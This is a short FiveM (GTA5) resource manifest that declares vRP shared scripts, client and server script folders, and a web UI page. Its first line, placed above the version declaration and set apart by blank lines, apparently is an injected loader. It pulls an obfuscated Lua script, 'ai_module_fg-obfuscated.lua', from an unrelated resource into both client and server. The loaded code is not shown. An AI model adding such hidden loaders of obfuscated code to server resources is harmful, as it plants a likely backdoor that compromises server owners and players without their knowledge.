shared_script '@comida/ai_module_fg-obfuscated.lua'



fx_version 'adamant'
game 'gta5'

lua54 'yes'

shared_scripts { "@vrp/lib/utils.lua", 'shared/tunnel.lua', 'shared/config.lua' }
client_scripts { 'client/*.lua' }
server_scripts { 'server/*.lua' }

ui_page 'web/index.html'

files {
	'web/index.html',
	'web/**/*',
}              